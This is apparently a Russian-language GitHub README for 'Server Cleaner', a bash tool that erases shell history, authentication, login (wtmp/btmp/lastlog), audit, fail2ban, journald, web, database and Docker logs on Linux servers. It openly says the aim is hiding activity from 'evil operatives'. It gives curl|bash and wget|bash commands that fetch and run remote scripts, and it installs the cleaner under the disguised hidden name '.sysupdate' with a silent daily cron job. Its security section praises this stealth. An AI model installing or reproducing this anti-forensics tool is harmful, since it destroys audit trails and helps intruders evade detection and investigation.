# Server Cleaner

🧹 Мощный скрипт для комплексной очистки логов, истории и следов активности на Linux серверах от злых оперативников.

## ⚠️ Предупреждение

Этот скрипт удаляет:
- Историю команд (bash, zsh, fish)
- Системные логи (auth, syslog, kern, dpkg, apt)
- Логи входов на сервер (wtmp, btmp, lastlog)
- Журналы systemd (journald)
- Логи веб-серверов (nginx, apache)
- Логи баз данных (MySQL, PostgreSQL, Redis)
- Логи Docker контейнеров (только логи, образы не трогаются)
- Логи fail2ban и audit
- Следы работы в редакторах (vim, nano, less)
- Coredumps
- Кеш пакетных менеджеров
- Временные файлы

**Используйте только на своих серверах и под свою ответственность!**

## 🚀 Быстрая установка

### Автоматическая установка (рекомендуется)

Умный установщик с автоматической установкой зависимостей:

```bash
curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/install.sh | bash
```

или с wget:

```bash
wget -qO- https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/install.sh | bash
```

**Возможности install.sh:**
- ✅ Автоматически проверяет и устанавливает зависимости (curl/wget, cron)
- ✅ Поддерживает apt, yum, dnf, pacman
- ✅ Обрабатывает ошибки и даёт понятные сообщения
- ✅ Спрашивает подтверждение перед добавлением в cron
- ✅ Предлагает сразу запустить очистку
- ✅ Цветной вывод для удобства
- ✅ Проверяет успешность установки

### Что происходит при установке:

1. Проверяет зависимости (curl/wget, cron)
2. Автоматически устанавливает недостающие пакеты (если запущено с sudo)
3. Создаёт скрытую директорию `~/.cache/system`
4. Скачивает скрипт как `.sysupdate`
5. Спрашивает, добавить ли в crontab (ежедневно в 00:00)
6. Предлагает запустить сразу

## 🗑️ Удаление

### Автоматическое удаление

Умный деинсталлятор с подтверждением:

```bash
curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/uninstall.sh | bash
```

**Возможности uninstall.sh:**
- ✅ Проверяет наличие установки
- ✅ Спрашивает подтверждение перед удалением
- ✅ Предлагает финальную очистку перед удалением
- ✅ Удаляет из crontab
- ✅ Удаляет скрипт и пустую директорию
- ✅ Обрабатывает ошибки
- ✅ Цветной вывод

### Ручное удаление

```bash
# Удалить из crontab
crontab -l | grep -v '.sysupdate' | crontab -

# Удалить скрипт
rm -f ~/.cache/system/.sysupdate

# Удалить директорию (если пустая)
rmdir ~/.cache/system 2>/dev/null
```

## 📋 Альтернативная установка

### Разовый запуск (без сохранения)

```bash
curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh | sudo bash
```

### Установка вручную

```bash
# Создать скрытую директорию
mkdir -p ~/.cache/system

# Скачать скрипт
curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh -o ~/.cache/system/.sysupdate
# или
wget -O ~/.cache/system/.sysupdate https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh

# Дать права на выполнение
chmod +x ~/.cache/system/.sysupdate

# Добавить в crontab (каждый день в 00:00)
(crontab -l 2>/dev/null; echo "0 0 * * * /bin/bash ~/.cache/system/.sysupdate >/dev/null 2>&1") | crontab -
```

## 🛠️ Использование

### Проверить установленные задачи cron

```bash
crontab -l
```

### Запустить вручную

```bash
bash ~/.cache/system/.sysupdate
```

или под root:

```bash
sudo bash ~/.cache/system/.sysupdate
```

### Обновить до последней версии

```bash
curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh -o ~/.cache/system/.sysupdate
chmod +x ~/.cache/system/.sysupdate
```

## 📝 Что очищает скрипт

### 🔤 История команд
- `~/.bash_history` — bash
- `~/.zsh_history` — zsh
- `~/.local/share/fish/fish_history` — fish
- `/root/.bash_history` и `/root/.zsh_history` — root
- **Текущая сессия** — очистка истории в памяти

### 📝 Следы редакторов
- `~/.viminfo` — история vim
- `~/.lesshst` — история less
- `~/.nano_history` — история nano

### 🗂️ Системные логи
- `/var/log/auth.log` — логи аутентификации
- `/var/log/syslog` — основной системный лог
- `/var/log/kern.log` — логи ядра
- `/var/log/dpkg.log` — логи установки пакетов
- `/var/log/apt/*` — логи apt
- `/var/log/secure` — альтернативный лог аутентификации (CentOS/RHEL)
- `/var/log/messages` — общие системные сообщения
- `/var/log/audit/audit.log` — логи auditd

### 👤 Логи входов
- `/var/log/wtmp` — история входов (команда `last`)
- `/var/log/btmp` — неудачные попытки входа (команда `lastb`)
- `/var/log/lastlog` — последний вход каждого пользователя (команда `lastlog`)

### 🌐 Логи веб-серверов
- `/var/log/nginx/*` — логи nginx
- `/var/log/apache2/*` — логи apache

### 🗄️ Логи баз данных
- `/var/log/mysql/*` — логи MySQL
- `/var/log/postgresql/*` — логи PostgreSQL
- `/var/log/redis/*` — логи Redis

### 🐳 Docker
- `/var/lib/docker/containers/*/*-json.log` — логи контейнеров
- **Образы и volumes НЕ удаляются!**

### 🛡️ Логи безопасности
- `/var/log/fail2ban.log` — логи fail2ban

### 🔧 Системные компоненты
- **Journald** — ротация и очистка журналов systemd
- **Coredumps** — удаление `/var/lib/systemd/coredump/*`
- **Кеш пакетов** — apt-get clean, yum clean, dnf clean
- **Временные файлы** — `/tmp`, `/var/tmp`, кеш apt

## 🔒 Безопасность

Скрипт:
- ✅ Работает тихо (без вывода в консоль при запуске через cron)
- ✅ Установлен в скрытую директорию `.cache/system`
- ✅ Имеет незаметное имя `.sysupdate`
- ✅ Запускается автоматически
- ✅ Использует `>/dev/null 2>&1` в crontab
- ✅ Совместим с `sh` и `bash`
- ✅ Очищает историю текущей сессии

## 💡 Особенности

- **Универсальность**: Работает на Debian, Ubuntu, CentOS, RHEL, Fedora, Arch
- **Умная установка**: Автоматическая проверка и установка зависимостей
- **Обработка ошибок**: Понятные сообщения и fallback механизмы
- **Безопасность**: Все ошибки подавлены при автоматическом запуске
- **Совместимость**: Проверяет наличие команд перед использованием
- **Комплексность**: Очищает следы из всех популярных сервисов
- **Автоматизация**: Однократная установка, работает постоянно
- **Мягкая очистка Docker**: Удаляет только логи, образы остаются
- **Интерактивность**: Спрашивает подтверждение при установке/удалении

## 🎨 Цветной вывод

Скрипты используют цветовую индикацию:
- 🟢 **Зелёный** — успешные операции
- 🟡 **Жёлтый** — предупреждения
- 🔴 **Красный** — ошибки

## 📦 Файлы

- `clean.sh` — основной скрипт очистки
- `install.sh` — умный установщик с проверкой зависимостей
- `uninstall.sh` — умный деинсталлятор с подтверждением

## 🔧 Требования

### Минимальные (автоматически установятся):
- `curl` или `wget`
- `cron` (для автоматического запуска)

### Опциональные:
- `sudo` — для некоторых операций
- Поддерживаемые пакетные менеджеры: apt, yum, dnf, pacman

## 🐛 Решение проблем

### Скрипт не скачивается

```bash
# Если curl не работает, попробуй wget
wget -O ~/.cache/system/.sysupdate https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh

# Проверь доступ к GitHub
ping raw.githubusercontent.com
```

### Ошибка при добавлении в crontab

```bash
# Проверь, установлен ли cron
command -v crontab

# Установи cron (Debian/Ubuntu)
sudo apt-get install cron

# Установи cron (CentOS/RHEL)
sudo yum install cronie
sudo systemctl enable crond
sudo systemctl start crond
```

### История не очищается

История текущей сессии хранится в памяти. Чтобы очистить текущую сессию:

```bash
# Запусти через source
source ~/.cache/system/.sysupdate

# или просто перезайди в терминал
```

## 📄 Лицензия

MIT

---

**Сделано с ❤️ для безопасности серверов**
